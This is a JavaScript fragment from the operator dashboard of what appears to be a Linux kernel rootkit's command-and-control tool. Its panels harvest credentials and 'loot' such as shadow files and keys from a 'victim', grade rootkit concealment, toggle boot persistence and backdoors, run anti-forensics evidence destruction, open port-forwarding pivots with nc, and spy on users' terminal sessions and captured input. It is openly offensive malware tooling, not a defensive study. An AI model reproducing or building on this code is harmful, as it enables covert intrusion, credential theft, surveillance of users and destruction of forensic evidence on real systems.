  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Recon Items</div><div style="font-size:22px;font-weight:700;color:var(--cyan)">'+loadedCount+'<span style="font-size:12px;color:var(--t4);font-weight:400">/'+CRED_ITEMS.length+'</span></div><div style="font-size:10px;color:var(--t3)">fetched</div></div>';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Deep Harvest</div><div style="font-size:22px;font-weight:700;color:var(--green)">'+harvestDone+'<span style="font-size:12px;color:var(--t4);font-weight:400">/'+harvestTotal+'</span></div><div style="font-size:10px;color:var(--t3)">completed</div></div>';
  const critItems=CRED_ITEMS.filter(c=>c.severity==='critical').length;
  const highItems=CRED_ITEMS.filter(c=>c.severity==='high').length;
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Critical Targets</div><div style="font-size:22px;font-weight:700;color:var(--red)">'+critItems+'</div><div style="font-size:10px;color:var(--t3)">shadow, keys</div></div>';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Privesc Vectors</div><div style="font-size:22px;font-weight:700;color:var(--orange)">'+highItems+'</div><div style="font-size:10px;color:var(--t3)">SUID, sudo, history</div></div>';
  h+='</div>';
  h+='<div class="tabs">';
  [{k:'recon',l:'System Recon ('+CRED_ITEMS.length+')'},{k:'harvest',l:'Deep Harvest ('+harvestTotal+')'},{k:'summary',l:'Loot Summary'}].forEach(t=>{h+='<div class="tab '+(S.credTab===t.k?'active':'')+'" onclick="S.credTab=\''+t.k+'\';renderPanel()">'+t.l+'</div>'});
  h+='</div>';
  if(S.credTab==='recon'){
    const sevOrder={critical:0,high:1,medium:2,low:3,info:4};
    const cats=['all','passwords','keys','privesc','recon','persist'];
    h+='<div style="display:flex;gap:6px;margin-bottom:14px;flex-wrap:wrap">';
    cats.forEach(c=>{
      const active=(S.credCatFilter||'all')===c;
      h+='<button class="btn btn-xs" style="'+(active?'background:var(--blue);color:#fff;border-color:var(--blue)':'')+'" onclick="S.credCatFilter=\''+c+'\';renderPanel()">'+c.charAt(0).toUpperCase()+c.slice(1)+'</button>';
    });
    h+='</div>';
    const fCat=S.credCatFilter||'all';
    const sorted=[...CRED_ITEMS].filter(c=>fCat==='all'||c.cat===fCat).sort((a,b)=>(sevOrder[a.severity]||9)-(sevOrder[b.severity]||9));
    sorted.forEach((c,si)=>{
      const i=CRED_ITEMS.indexOf(c);
      const loaded=S.credsLoaded[i];
      const borderClr=c.severity==='critical'?'var(--red)':c.severity==='high'?'var(--orange)':c.severity==='medium'?'var(--yellow)':'var(--t4)';
      h+='<div class="card" style="padding:0;overflow:hidden;margin-bottom:10px;border-left:3px solid '+borderClr+'">';
      h+='<div style="padding:10px 14px;display:flex;align-items:center;justify-content:space-between;cursor:pointer" onclick="S.credOpen=S.credOpen==='+i+'?-1:'+i+';renderPanel()">';
      h+='<div style="display:flex;align-items:center;gap:10px"><span class="badge '+sevCls(c.severity)+'" style="font-size:9px">'+c.severity.toUpperCase()+'</span><span style="font-weight:600;color:var(--t1);font-size:13px">'+esc(c.name)+'</span>';
      if(loaded===true)h+='<span class="badge b-pass" style="font-size:8px;padding:1px 6px">LOADED</span>';
      h+='</div><div style="display:flex;align-items:center;gap:8px">';
      if(loaded==='loading')h+='<span class="badge b-warn" style="padding:3px 10px"><span class="spinner" style="width:10px;height:10px;margin-right:4px"></span>Fetching</span>';
      else h+='<button class="btn btn-xs" onclick="event.stopPropagation();loadCred('+i+')">'+(loaded===true?I.refresh+' Reload':I.download+' Fetch')+'</button>';
      h+='<span style="color:var(--t4);font-size:14px;transition:transform .2s;transform:rotate('+(S.credOpen===i?'180':'0')+'deg)">▼</span>';
      h+='</div></div>';
      h+='<div style="padding:0 14px 6px;font-size:11px;color:var(--t3)">'+esc(c.desc)+'</div>';
      if(S.credOpen===i&&loaded===true&&c.data){
        const hasPassword=c.data.match(/\$[0-9y]\$|password|passwd/i);
        h+='<div style="border-top:1px solid var(--border);padding:10px 14px;background:var(--bg-0)">';
        if(hasPassword)h+='<div style="margin-bottom:8px"><span class="badge b-critical" style="font-size:9px;padding:2px 8px">SECRETS DETECTED</span></div>';
        h+='<pre style="margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--font-mono);font-size:11px;line-height:1.6;color:var(--t2);max-height:300px;overflow-y:auto">'+esc(c.data)+'</pre></div>';
      }
      h+='</div>';
    });
  }else if(S.credTab==='harvest'){
    h+='<div style="display:flex;flex-direction:column;gap:10px">';
    Object.keys(HARVEST_CMDS).forEach(id=>{
      const cat=HARVEST_CMDS[id];const res=S.harvestResults[id];const running=res&&res.running;
      const borderClr=cat.severity==='critical'?'var(--red)':cat.severity==='high'?'var(--orange)':'var(--yellow)';
      h+='<div class="card" style="padding:0;overflow:hidden;border-left:3px solid '+borderClr+'">';
      h+='<div style="padding:12px 14px;display:flex;align-items:center;justify-content:space-between">';
      h+='<div style="display:flex;align-items:center;gap:8px"><span class="badge '+sevCls(cat.severity)+'" style="font-size:8px">'+cat.severity.toUpperCase()+'</span><span style="font-weight:600;font-size:12px;color:var(--t1)">'+esc(cat.name)+'</span>';
      if(res&&res.data&&res.data!=='(no data)')h+='<span class="badge b-pass" style="font-size:8px;padding:1px 6px">'+res.data.split('\\n').filter(l=>l.trim()).length+' lines</span>';
      h+='</div>';
      h+='<button class="btn btn-xs '+(res&&res.data&&res.data!=='(no data)'?'btn-success':'btn-primary')+'" onclick="harvestSingle(\''+id+'\')" '+(running?'disabled':'')+'>'+( running?'<span class="spinner" style="width:10px;height:10px"></span> Harvesting...':(res&&res.data&&res.data!=='(no data)'?I.refresh+' Re-harvest':I.harvest+' Harvest'))+'</button>';
      h+='</div>';
      if(res&&res.data&&res.data!=='(no data)'){
        h+='<div style="border-top:1px solid var(--border);padding:10px 14px;background:var(--bg-0)"><pre class="mono" style="font-size:10px;color:var(--t2);max-height:180px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;margin:0">'+esc(res.data)+'</pre></div>';
      }
      h+='</div>';
    });
    h+='</div>';
  }else if(S.credTab==='summary'){
    const loot=[];
    CRED_ITEMS.forEach((c,i)=>{if(S.credsLoaded[i]===true&&c.data&&c.data.length>5)loot.push({src:'recon',name:c.name,sev:c.severity,size:c.data.length,lines:c.data.split('\\n').length})});
    Object.keys(S.harvestResults).forEach(id=>{const r=S.harvestResults[id];if(r&&r.data&&r.data!=='(no data)')loot.push({src:'harvest',name:HARVEST_CMDS[id]?.name||id,sev:HARVEST_CMDS[id]?.severity||'medium',size:r.data.length,lines:r.data.split('\\n').length})});
    if(loot.length===0)h+='<div class="card" style="text-align:center;padding:40px;color:var(--t3)">No loot collected yet. Use System Recon or Deep Harvest to extract data from the victim.</div>';
    else{
      const totalBytes=loot.reduce((s,l)=>s+l.size,0);const critLoot=loot.filter(l=>l.sev==='critical').length;
      h+='<div class="card" style="padding:14px;margin-bottom:16px;border-left:3px solid var(--green)"><div style="display:flex;gap:24px;flex-wrap:wrap">';
      h+='<div><span style="font-size:10px;color:var(--t4);text-transform:uppercase">Total Loot</span><div style="font-size:20px;font-weight:700;color:var(--green)">'+loot.length+' items</div></div>';
      h+='<div><span style="font-size:10px;color:var(--t4);text-transform:uppercase">Data Size</span><div style="font-size:20px;font-weight:700;color:var(--cyan)">'+(totalBytes>1024?(totalBytes/1024).toFixed(1)+' KB':totalBytes+' B')+'</div></div>';
      h+='<div><span style="font-size:10px;color:var(--t4);text-transform:uppercase">Critical</span><div style="font-size:20px;font-weight:700;color:var(--red)">'+critLoot+'</div></div>';
      h+='</div></div>';
      h+='<div class="card" style="padding:0;overflow:hidden"><table class="dtable"><thead><tr><th>Source</th><th>Name</th><th>Severity</th><th>Data Size</th><th>Lines</th></tr></thead><tbody>';
      loot.sort((a,b)=>{const o={critical:0,high:1,medium:2,info:3};return(o[a.sev]||9)-(o[b.sev]||9)}).forEach(l=>{
        h+='<tr><td><span class="badge b-info" style="font-size:8px">'+l.src+'</span></td><td style="font-weight:600;color:var(--t1)">'+esc(l.name)+'</td><td><span class="badge '+sevCls(l.sev)+'">'+l.sev.toUpperCase()+'</span></td><td class="mono" style="font-size:11px">'+(l.size>1024?(l.size/1024).toFixed(1)+' KB':l.size+' B')+'</td><td class="mono">'+l.lines+'</td></tr>';
      });
      h+='</tbody></table></div>';
    }
  }
  return h;
};

/* (MITRE ATT&CK panel removed) */

/* ===== STEALTH AUDIT ===== */
panels.stealth=function(){
  let h='<div class="panel-hdr"><div><div class="panel-title">Stealth Audit</div><div class="panel-sub">Rootkit concealment, persistence &amp; hook verification — '+STEALTH_CHECKS.length+' checks</div></div><div class="panel-actions"><button class="btn btn-sm btn-success" onclick="runStealthAll()"'+(S.stRunning?' disabled':'')+'>'+I.shield+(S.stRunning?' Running...':' Run All Checks')+'</button></div></div>';
  const pass=Object.values(S.stRes).filter(r=>r.pass).length;
  const fail=Object.values(S.stRes).filter(r=>!r.pass&&r.done).length;
  const total=Object.keys(S.stRes).length;
  const pct=total>0?Math.round(pass/STEALTH_CHECKS.length*100):0;
  const grade=pct>=90?'A':pct>=75?'B':pct>=55?'C':pct>=35?'D':'F';
  const gradeC=pct>=90?'var(--green)':pct>=75?'var(--cyan)':pct>=55?'var(--yellow)':'var(--red)';
  h+='<div class="grid g4" style="margin-bottom:16px">';
  h+='<div class="card" style="padding:12px 14px;text-align:center"><div style="font-size:36px;font-weight:800;color:'+gradeC+'">'+grade+'</div><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Grade</div></div>';
  h+='<div class="card" style="padding:12px 14px;text-align:center"><div style="font-size:28px;font-weight:700;color:var(--green)">'+pass+'</div><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Passed</div></div>';
  h+='<div class="card" style="padding:12px 14px;text-align:center"><div style="font-size:28px;font-weight:700;color:var(--red)">'+fail+'</div><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Failed</div></div>';
  h+='<div class="card" style="padding:12px 14px;text-align:center"><div style="font-size:28px;font-weight:700;color:var(--t2)">'+total+'/'+STEALTH_CHECKS.length+'</div><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Completed</div></div>';
  h+='</div>';
  if(total>0){
    h+='<div class="card" style="padding:10px 14px;margin-bottom:16px"><div style="height:8px;background:var(--bg-0);border-radius:4px;overflow:hidden"><div style="height:100%;width:'+pct+'%;background:linear-gradient(90deg,var(--green),var(--cyan));border-radius:4px;transition:width .3s"></div></div>';
    h+='<div style="font-size:11px;color:var(--t3);margin-top:6px;text-align:center">'+pct+'% concealment score — '+(pct>=90?'Excellent stealth':pct>=75?'Good concealment':pct>=55?'Moderate risk':'Critical exposure')+'</div></div>';
  }
  const cats={hide:'Concealment',persist:'Persistence',offense:'Offensive',crypto:'Crypto &amp; Auth',hooks:'Ftrace Hooks'};
  const catIcons={hide:I.eye,persist:I.anchor,offense:I.bug,crypto:I.lock,hooks:I.cpu};
  Object.entries(cats).forEach(([cat,label])=>{
    const items=STEALTH_CHECKS.filter(c=>c.cat===cat);if(items.length===0)return;
    const catPass=items.filter(c=>S.stRes[c.id]&&S.stRes[c.id].pass).length;
    const catDone=items.filter(c=>S.stRes[c.id]&&S.stRes[c.id].done).length;
    const catColor=catDone===0?'var(--t4)':catPass===items.length?'var(--green)':catPass>0?'var(--yellow)':'var(--red)';
    h+='<div class="card" style="padding:0;overflow:hidden;margin-bottom:12px">';
    h+='<div style="padding:10px 14px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">';
    h+='<div style="display:flex;align-items:center;gap:8px"><span style="color:'+catColor+'">'+catIcons[cat]+'</span><span style="font-size:13px;font-weight:600;color:var(--t1)">'+label+'</span></div>';
    if(catDone>0)h+='<span style="font-size:11px;color:'+catColor+'">'+catPass+'/'+items.length+' passed</span>';
    h+='</div>';
    h+='<table class="dtable" style="margin:0"><tbody>';
    items.forEach(ck=>{
      const res=S.stRes[ck.id];
      let status='<span style="color:var(--t4)">—</span>';
      if(res&&res.running)status='<span class="badge b-warn" style="animation:pulse 1s infinite">⏳</span>';
      else if(res&&res.done)status=res.pass?'<span class="badge b-pass">PASS</span>':'<span class="badge b-fail">FAIL</span>';
      h+='<tr><td style="width:32px;font-weight:600;color:var(--t4);text-align:center;font-size:10px">'+ck.id+'</td>';
      h+='<td style="font-weight:500;color:var(--t1);font-size:12px">'+esc(ck.name)+'</td>';
      h+='<td style="font-size:10px;color:var(--t4);max-width:400px">'+esc(ck.desc)+'</td>';
      h+='<td style="width:60px;text-align:center">'+status+'</td>';
      h+='<td style="width:50px"><button class="btn btn-xs" onclick="runStealthSingle('+ck.id+')"'+(res&&res.running?' disabled':'')+'>Test</button></td></tr>';
      if(res&&res.done&&res.output){
        h+='<tr><td></td><td colspan="4"><pre class="mono" style="font-size:10px;color:var(--t3);background:var(--bg-0);padding:6px 10px;border-radius:4px;margin:0 0 6px;white-space:pre-wrap;max-height:80px;overflow-y:auto">'+esc((res.output||'').substring(0,300))+'</pre></td></tr>';
      }
    });
    h+='</tbody></table></div>';
  });
  return h;
};

/* ===== PERSISTENCE ===== */
panels.persistence=function(){
  const active=S.mechs.filter(m=>m.status).length;
  let h='<div class="panel-hdr"><div><div class="panel-title">Persistence</div><div class="panel-sub">Boot survival &amp; backdoor mechanisms</div></div><div class="panel-actions"><button class="btn btn-sm btn-success" onclick="persistCheckAll()"'+(S.persistChecking?' disabled':'')+'>'+I.shield+(S.persistChecking?' Checking...':' Check All Status')+'</button></div></div>';
  h+='<div class="grid g3" style="margin-bottom:16px">';
  h+='<div class="card" style="padding:12px 14px;text-align:center"><div style="font-size:28px;font-weight:700;color:var(--green)">'+active+'</div><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Active</div></div>';
  h+='<div class="card" style="padding:12px 14px;text-align:center"><div style="font-size:28px;font-weight:700;color:var(--t4)">'+(S.mechs.length-active)+'</div><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Inactive</div></div>';
  h+='<div class="card" style="padding:12px 14px;text-align:center"><div style="font-size:28px;font-weight:700;color:var(--cyan)">'+S.mechs.length+'</div><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Total</div></div>';
  h+='</div>';
  h+='<div style="display:flex;flex-direction:column;gap:10px">';
  S.mechs.forEach((m,i)=>{
    const riskC=m.risk==='low'?'var(--green)':m.risk==='medium'?'var(--yellow)':'var(--red)';
    h+='<div class="card" style="padding:14px;border-left:3px solid '+(m.status?'var(--green)':'var(--bg-2)')+'"><div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px"><div style="display:flex;align-items:center;gap:10px">';
    h+='<span class="badge '+(m.status?'b-pass':'b-fail')+'">'+(m.status?'ACTIVE':'OFF')+'</span>';
    h+='<span style="font-weight:600;color:var(--t1)">'+esc(m.name)+'</span>';
    h+='<span class="badge" style="background:color-mix(in srgb,'+riskC+' 15%,transparent);color:'+riskC+';font-size:9px">'+m.risk.toUpperCase()+' DETECT</span>';
    h+='</div>';
    h+='<div style="display:flex;gap:6px;align-items:center">';
    if(m.id<=6)h+='<button class="btn btn-xs '+(m.status?'btn-danger':'btn-success')+'" onclick="toggleMech('+i+','+(!m.status)+')">'+(m.status?'Disable':'Enable')+'</button>';
    h+='</div></div>';
    h+='<div style="font-size:12px;color:var(--t3);margin-bottom:6px">'+esc(m.desc)+'</div>';
    h+='<div class="mono" style="font-size:10px;color:var(--t4);background:var(--bg-0);padding:6px 10px;border-radius:4px">'+esc(m.detail)+'</div>';
    if(m.lastCheck){h+='<div style="font-size:10px;color:var(--t4);margin-top:4px">Last check: '+m.lastCheck+'</div>'}
    h+='</div>';
  });
  h+='</div>';
  return h;
};



/* ===== ANTI-FORENSICS ===== */
panels.antiforensics=function(){
  const cats={};AF_ACTIONS.forEach(a=>{if(!cats[a.cat])cats[a.cat]=[];cats[a.cat].push(a)});
  const done=Object.keys(S.afDone).length;
  let h='<div class="panel-hdr"><div><div class="panel-title">Anti-Forensics</div><div class="panel-sub">Evidence destruction &amp; artifact cleanup — '+AF_ACTIONS.length+' actions</div></div><div class="panel-actions"><button class="btn btn-sm btn-danger" onclick="afRunAll()">'+I.eraser+' Execute All</button></div></div>';
  h+='<div class="grid g3" style="margin-bottom:16px">';
  h+='<div class="card" style="padding:12px 14px;text-align:center"><div style="font-size:28px;font-weight:700;color:var(--green)">'+done+'</div><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Executed</div></div>';
  h+='<div class="card" style="padding:12px 14px;text-align:center"><div style="font-size:28px;font-weight:700;color:var(--t4)">'+(AF_ACTIONS.length-done)+'</div><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Pending</div></div>';
  h+='<div class="card" style="padding:12px 14px;text-align:center"><div style="font-size:28px;font-weight:700;color:var(--red)">'+AF_ACTIONS.filter(a=>a.severity==='critical').length+'</div><div style="font-size:10px;color:var(--t4);text-transform:uppercase">Critical</div></div>';
  h+='</div>';
  Object.keys(cats).forEach(cat=>{
    h+='<div class="card" style="padding:0;overflow:hidden;margin-bottom:12px">';
    h+='<div style="padding:10px 14px;border-bottom:1px solid var(--border);font-size:13px;font-weight:600;color:var(--t1)">'+cat+'</div>';
    cats[cat].forEach(a=>{
      const isDone=S.afDone[a.id];
      const running=S.afRunning[a.id];
      const sevC=a.severity==='critical'?'var(--red)':a.severity==='high'?'var(--orange)':'var(--yellow)';
      h+='<div style="display:flex;align-items:center;gap:12px;padding:10px 14px;border-bottom:1px solid var(--border);border-left:3px solid '+sevC+'">';
      h+='<div style="flex:1"><div style="display:flex;align-items:center;gap:8px;margin-bottom:3px"><span class="badge '+sevCls(a.severity)+'" style="font-size:8px">'+a.severity.toUpperCase()+'</span><span style="font-weight:600;font-size:12px;color:var(--t1)">'+esc(a.name)+'</span>';
      if(isDone)h+='<span style="font-size:10px;color:var(--green)">&#10003;</span>';
      h+='</div>';
      h+='<div style="font-size:11px;color:var(--t3)">'+esc(a.desc)+'</div>';
      h+='<div class="mono" style="font-size:10px;color:var(--t4);margin-top:3px">$ '+esc(a.cmd.replace(';echo OK',''))+'</div>';
      if(isDone&&S.afOutput[a.id]){h+='<div style="font-size:10px;color:var(--green);margin-top:2px">Output: '+esc(S.afOutput[a.id].substring(0,100))+'</div>'}
      h+='</div>';
      h+='<button class="btn btn-sm '+(isDone?'btn-success':'btn-danger')+'" onclick="afExec(\''+a.id+'\')" '+(running?'disabled':'')+' style="min-width:80px">'+(running?'Running...':(isDone?'Re-run':'Execute'))+'</button>';
      h+='</div>';
    });
    h+='</div>';
  });
  return h;
};



/* ===== MODULES ===== */
panels.modules=function(){
  const byCat={};S.mods.forEach(m=>{if(!byCat[m.cat])byCat[m.cat]=[];byCat[m.cat].push(m)});
  const active=S.mods.filter(m=>m.status).length;
  let h='<div class="panel-hdr"><div><div class="panel-title">Rootkit Modules</div><div class="panel-sub">Kernel-level components — '+active+'/'+S.mods.length+' active</div></div></div>';
  h+='<div class="card" style="padding:12px 14px;margin-bottom:16px;border-left:3px solid var(--cyan)"><div style="font-size:12px;color:var(--t3)">All modules are compiled into the LKM and activated during <span class="mono" style="color:var(--cyan)">c2_thread_fn()</span> init sequence. They cannot be individually toggled at runtime.</div></div>';
  Object.keys(byCat).forEach(cat=>{
    h+='<div class="card" style="padding:0;overflow:hidden;margin-bottom:12px">';
    h+='<div style="padding:10px 14px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center"><span style="font-size:13px;font-weight:600;color:var(--t1)">'+cat+'</span><span class="badge b-info" style="font-size:9px">'+byCat[cat].length+'</span></div>';
    byCat[cat].forEach(m=>{
      h+='<div style="padding:10px 14px;border-bottom:1px solid var(--border)">';
      h+='<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px"><span class="badge '+(m.status?'b-pass':'b-fail')+'" style="font-size:8px">'+(m.status?'ACTIVE':'OFF')+'</span><span style="font-weight:600;font-size:12px;color:var(--t1)">'+esc(m.name)+'</span></div>';
      h+='<div style="font-size:11px;color:var(--t3);margin-bottom:4px">'+esc(m.desc)+'</div>';
      h+='<div class="mono" style="font-size:10px;color:var(--cyan)">'+esc(m.hook)+'</div>';
      h+='</div>';
    });
    h+='</div>';
  });
  return h;
};



/* ===== ACTIVITY LOG ===== */
panels.activity=function(){
  const types=['all','info','cmd','rootkit','warn','error','success'];
  let filtered=S.events;
  if(S.actFilter!=='all')filtered=filtered.filter(e=>e.type===S.actFilter);
  if(S.actSearch)filtered=filtered.filter(e=>e.msg.toLowerCase().includes(S.actSearch.toLowerCase()));
  let h='<div class="panel-hdr"><div><div class="panel-title">Activity Log</div><div class="panel-sub">'+S.events.length+' total events'+(filtered.length!==S.events.length?' ('+filtered.length+' shown)':'')+'</div></div><div class="panel-actions"><button class="btn btn-sm" onclick="exportLog()">'+I.download+' Export JSON</button><button class="btn btn-sm btn-danger" onclick="S.events=[];renderPanel()">'+I.trash+' Clear</button></div></div>';
  h+='<div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap">';
  types.forEach(t=>{h+='<button class="btn btn-xs '+(S.actFilter===t?'btn-active':'')+'" onclick="S.actFilter=\''+t+'\';renderPanel()">'+t.charAt(0).toUpperCase()+t.slice(1)+'</button>'});
  h+='<input class="input" style="flex:1;min-width:160px" placeholder="Search events..." value="'+esc(S.actSearch)+'" oninput="S.actSearch=this.value;renderPanel()">';
  h+='</div>';
  h+='<div class="card" style="padding:0;overflow:hidden"><div style="max-height:500px;overflow-y:auto"><table class="dtable"><thead><tr><th style="width:100px">Time</th><th style="width:80px">Type</th><th>Message</th></tr></thead><tbody>';
  filtered.slice().reverse().forEach(ev=>{
    h+='<tr><td class="mono" style="font-size:11px;color:var(--t3)">'+esc(ev.time)+'</td><td><span class="badge '+typeCls(ev.type)+'">'+ev.type+'</span></td><td style="font-size:12px">'+esc(ev.msg)+'</td></tr>';
  });
  if(filtered.length===0)h+='<tr><td colspan="3" style="text-align:center;padding:30px;color:var(--t4)">No events to display</td></tr>';
  h+='</tbody></table></div></div>';
  return h;
};

/* (Port Scanner and Packet Sniffer merged into Network panel tabs) */

/* ===== REVERSE TUNNELS ===== */
panels.tunnels=function(){
  let h='<div class="panel-hdr"><div><div class="panel-title">Port Forwarding &amp; Pivoting</div><div class="panel-sub">TCP forwarding, SOCKS proxy, and network pivoting from victim</div></div></div>';
  h+='<div class="grid g3" style="margin-bottom:16px">';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Active Forwards</div><div style="font-size:22px;font-weight:700;color:var(--green)">'+S.tunnels.length+'</div></div>';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Attacker IP</div><div style="font-size:14px;font-weight:600;color:var(--cyan);font-family:var(--font-mono)">'+esc(S.attackerIP||'?')+'</div></div>';
  h+='<div class="card" style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;letter-spacing:.5px">Victim IP</div><div style="font-size:14px;font-weight:600;color:var(--red);font-family:var(--font-mono)">'+esc(S.victimIP||'?')+'</div></div>';
  h+='</div>';
  h+='<div class="card" style="padding:14px;margin-bottom:16px"><div style="font-size:12px;font-weight:600;color:var(--t1);margin-bottom:10px">Create Port Forward</div>';
  h+='<div style="font-size:11px;color:var(--t3);margin-bottom:12px">Forward a port on the victim to expose internal services, or create a local listener that pipes to a remote target.</div>';
  h+='<div style="display:flex;gap:8px;align-items:flex-end;flex-wrap:wrap;margin-bottom:12px">';
  h+='<div><label style="font-size:10px;color:var(--t4);display:block;margin-bottom:4px">Type</label><select class="input" id="tunType" style="width:160px"><option value="python">TCP Proxy (python3)</option><option value="nc">Pipe (nc single)</option><option value="ncloop">Pipe (nc loop)</option></select></div>';
  h+='<div><label style="font-size:10px;color:var(--t4);display:block;margin-bottom:4px">Listen Port</label><input class="input" id="tunListen" value="4444" style="width:90px"></div>';
  h+='<div><label style="font-size:10px;color:var(--t4);display:block;margin-bottom:4px">Target Host</label><input class="input" id="tunHost" value="127.0.0.1" style="width:130px"></div>';
  h+='<div><label style="font-size:10px;color:var(--t4);display:block;margin-bottom:4px">Target Port</label><input class="input" id="tunTarget" value="22" style="width:90px"></div>';
  h+='<button class="btn btn-sm btn-primary" onclick="createTunnel()">'+I.link+' Create</button>';
  h+='</div>';
  h+='<div style="display:flex;gap:6px;flex-wrap:wrap">';
  h+='<button class="btn btn-xs" onclick="tunPreset(\'ssh\')">SSH (22→4444)</button>';
  h+='<button class="btn btn-xs" onclick="tunPreset(\'http\')">HTTP (80→8081)</button>';
  h+='<button class="btn btn-xs" onclick="tunPreset(\'db\')">MySQL (3306→3307)</button>';
  h+='<button class="btn btn-xs" onclick="tunPreset(\'rdp\')">RDP (3389→3390)</button>';
  h+='</div></div>';
  h+='<div class="card" style="padding:0;overflow:hidden"><div style="padding:10px 14px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center"><span style="font-size:13px;font-weight:600;color:var(--t1)">Active Forwards ('+S.tunnels.length+')</span><button class="btn btn-xs" onclick="refreshTunnels()">'+I.refresh+' Check Status</button></div>';
  if(S.tunnels.length===0)h+='<div style="color:var(--t4);font-size:12px;padding:20px;text-align:center">No active port forwards. Create one above.</div>';
  else{
    h+='<table class="dtable"><thead><tr><th>Type</th><th>Listen</th><th>Target</th><th>PID</th><th>Status</th><th></th></tr></thead><tbody>';
    S.tunnels.forEach((t,i)=>{
      h+='<tr><td><span class="badge b-info" style="font-size:9px">'+esc(t.type||'socat')+'</span></td>';
      h+='<td class="mono" style="font-size:11px;color:var(--cyan)">0.0.0.0:'+esc(t.listen)+'</td>';
      h+='<td class="mono" style="font-size:11px">'+esc(t.host)+':'+esc(t.target)+'</td>';
      h+='<td class="mono" style="font-size:10px;color:var(--t3)">'+esc(t.pid)+'</td>';
      h+='<td><span class="badge '+(t.status==='dead'?'b-fail':'b-pass')+'">'+(t.status||'ACTIVE')+'</span></td>';
      h+='<td><button class="btn btn-xs btn-danger" onclick="killTunnel('+i+')">'+I.xmark+'</button></td></tr>';
    });
    h+='</tbody></table>';
  }
  h+='</div>';
  return h;
};

/* ===== SURVEILLANCE ===== */
panels.surveillance=function(){
  let h='<div class="panel-hdr"><div><div class="panel-title">Surveillance</div><div class="panel-sub">Session spying, file monitoring, screen capture</div></div></div>';
  h+='<div class="tabs">';
  [{k:'spy',l:'Session Spy'},{k:'files',l:'File Monitor'},{k:'authlogs',l:'Auth Logs'}].forEach(t=>{h+='<div class="tab '+(S.survTab===t.k?'active':'')+'" onclick="S.survTab=\''+t.k+'\';renderPanel()">'+t.l+'</div>'});
  h+='</div>';
  if(S.survTab==='spy'){
    h+='<div class="card" style="padding:14px;margin-bottom:16px"><div style="font-size:12px;font-weight:600;color:var(--t1);margin-bottom:10px">Spy on Active Sessions</div>';
    h+='<div style="font-size:11px;color:var(--t3);margin-bottom:12px">See what processes are running on each user terminal and monitor their activity in real-time.</div>';
    h+='<div style="display:flex;gap:8px;align-items:flex-end;margin-bottom:12px"><button class="btn btn-sm" onclick="survListPts()">'+I.refresh+' List Active Sessions</button>';
    h+='<div style="display:flex;gap:8px;align-items:center"><input class="input" id="spyPts" placeholder="pts/0" style="width:120px" value="'+(S.survSpyData?esc(S.survSpyData.pts):'pts/0')+'"><button class="btn btn-sm btn-primary" onclick="survSpySession()">'+I.search+' Spy</button></div></div>';
    if(S.survPtsList.length>0){
      h+='<div style="margin-bottom:12px"><div style="font-size:11px;font-weight:600;color:var(--t2);margin-bottom:6px">Active terminals:</div>';
      h+='<div style="display:flex;gap:6px;flex-wrap:wrap">';
      S.survPtsList.forEach(p=>{
        h+='<button class="btn btn-xs" onclick="document.getElementById(\'spyPts\').value=\''+esc(p.tty)+'\';S.survSpyData=null;survSpySession()" style="'+(p.user==='root'?'border-color:var(--red);color:var(--red)':'')+'"><span style="font-weight:600">'+esc(p.user)+'</span>@'+esc(p.tty)+' <span style="color:var(--t4);font-size:9px">'+esc(p.cmd)+'</span></button>';
      });
      h+='</div></div>';
    }
    h+='</div>';
    if(S.survSpyData){
      h+='<div class="card" style="padding:0;overflow:hidden;border-left:3px solid var(--cyan)">';
      h+='<div style="padding:10px 14px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;background:var(--bg-2)"><span style="font-size:12px;font-weight:600;color:var(--t1)">Session: /dev/'+esc(S.survSpyData.pts)+'</span><span class="mono" style="font-size:10px;color:var(--t3)">'+esc(S.survSpyData.time)+'</span></div>';
      h+='<div style="padding:10px 14px;border-bottom:1px solid var(--border)"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;margin-bottom:4px">Processes on this terminal</div>';
      h+='<pre class="mono" style="margin:0;font-size:11px;color:var(--green);line-height:1.6;white-space:pre-wrap">'+esc(S.survSpyData.procs||'(none)')+'</pre></div>';
      if(S.survSpyData.captured&&S.survSpyData.captured!=='(no recent input)'){
        h+='<div style="padding:10px 14px"><div style="font-size:10px;color:var(--t4);text-transform:uppercase;margin-bottom:4px">Captured Input</div>';
        h+='<pre class="mono" style="margin:0;font-size:11px;color:var(--yellow);line-height:1.6;white-space:pre-wrap;background:var(--bg-0);padding:8px;border-radius:4px">'+esc(S.survSpyData.captured)+'</pre></div>';
      }
      h+='</div>';
    }
  }else if(S.survTab==='files'){
    h+='<div class="card" style="padding:14px;margin-bottom:16px"><div style="font-size:12px;font-weight:600;color:var(--t1);margin-bottom:8px">File Integrity Monitor</div>';
    h+='<div style="font-size:11px;color:var(--t3);margin-bottom:12px">Check for recent modifications to sensitive system files — detect admin activity or competing attackers.</div>';
